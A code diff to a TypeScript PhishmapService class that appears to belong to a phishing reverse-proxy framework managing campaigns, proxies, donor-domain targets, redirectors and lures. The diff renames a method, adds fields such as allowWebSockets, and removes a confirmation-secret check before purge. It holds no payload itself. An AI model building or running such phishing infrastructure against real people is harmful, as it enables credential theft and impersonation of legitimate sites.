@@ -22,8 +22,14 @@ import {
   RestorePhishmapData
 } from './phishmap.js'
 
+/*
+ * Phishmap service
+ */
 export class PhishmapService {
-  static inject(container: DIContainer) {
+  /*
+   * Register dependency
+   */
+  static register(container: DIContainer) {
     container.registerSingleton<PhishmapService>(
       PHISHMAP_SERVICE,
       (c) =>
@@ -37,18 +43,17 @@ export class PhishmapService {
     )
   }
 
-  protected confirmSecret: string
-
   constructor(
     protected readonly campaignRepository: CampaignRepository,
     protected readonly proxyRepository: ProxyRepository,
     protected readonly targetRepository: TargetRepository,
     protected readonly redirectorRepository: RedirectorRepository,
     protected readonly lureRepository: LureRepository
-  ) {
-    this.confirmSecret = randomIdent()
-  }
+  ) {}
 
+  /*
+   * Dump phishmap
+   */
   async dump(data: DumpPhishmapData): Promise<Phishmap> {
     let lockSecret: string
     try {
@@ -101,7 +106,7 @@ export class PhishmapService {
         targets: targets.map((target) => {
           return {
             targetId: target.targetId,
-            isLanding: target.isLanding,
+            accessLevel: target.accessLevel,
             donorSecure: target.donorSecure,
             donorSub: target.donorSub,
             donorDomain: target.donorDomain,
@@ -120,6 +125,7 @@ export class PhishmapService {
             faviconIco: target.faviconIco,
             robotsTxt: target.robotsTxt,
             sitemapXml: target.sitemapXml,
+            allowWebSockets: target.allowWebSockets,
             isEnabled: target.isEnabled
           }
         }),
@@ -143,6 +149,9 @@ export class PhishmapService {
     }
   }
 
+  /*
+   * Restore phishmap
+   */
   async restore(data: RestorePhishmapData): Promise<true> {
     const { campaign, proxies, targets, redirectors, lures } = data.phishmap
 
@@ -204,7 +213,7 @@ export class PhishmapService {
         await this.targetRepository.create(
           campaignId,
           target.targetId,
-          target.isLanding,
+          target.accessLevel,
           target.donorSecure,
           target.donorSub,
           target.donorDomain,
@@ -222,6 +231,7 @@ export class PhishmapService {
           target.faviconIco,
           target.robotsTxt,
           target.sitemapXml,
+          target.allowWebSockets,
           lockSecret
         )
 
@@ -263,9 +273,10 @@ export class PhishmapService {
     }
   }
 
+  /*
+   * Purge phishmap
+   */
   async purge(data: PurgePhishmapData): Promise<true> {
-    this.checkConfirmSecret(data.confirmSecret)
-
     let lockSecret: string
     try {
       lockSecret = await this.campaignRepository.lock(data.campaignId)
@@ -344,19 +355,5 @@ export class PhishmapService {
     }
 
     return true
-  }
-
-  protected checkConfirmSecret(confirmSecret: string | undefined) {
-    if (!(confirmSecret && confirmSecret === this.confirmSecret)) {
-      throw new ReplServerError(`Phishmap action canceled`, {
-        context: {
-          reason: `Confirm secret not provided or not match`,
-          confirmSecret: this.confirmSecret
-        },
-        code: 'FORBIDDEN'
-      })
-    }
-
-    this.confirmSecret = randomIdent()
   }
 }
